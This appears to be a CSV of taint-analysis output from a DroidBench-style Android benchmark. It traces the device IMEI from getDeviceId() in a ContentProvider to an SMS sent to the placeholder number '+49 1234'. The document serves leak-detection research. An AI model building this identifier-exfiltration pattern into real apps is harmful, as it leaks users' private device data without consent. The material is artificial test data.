,method,stmtLineNumber,stmt
0,<de.ecspride.ContentProvider: boolean onCreate()>,-1,$r4 = virtualinvoke r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()
1,<de.ecspride.ContentProvider: boolean onCreate()>,-1,<de.ecspride.ApplicationLifecyle3: java.lang.String imei> = $r4
2,<de.ecspride.ContentProvider: boolean onCreate()>,-1,return 0
3,<dummyMainClass: void dummyMainMethod(java.lang.String[])>,-1,virtualinvoke $r2.<de.ecspride.ApplicationLifecyle3: void onCreate()>()
4,<de.ecspride.ApplicationLifecyle3: void onCreate()>,-1,$r1 = <de.ecspride.ApplicationLifecyle3: java.lang.String imei>
5,<de.ecspride.ApplicationLifecyle3: void onCreate()>,-1,"virtualinvoke $r2.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>(""+49 1234"", null, $r1, null, null)"
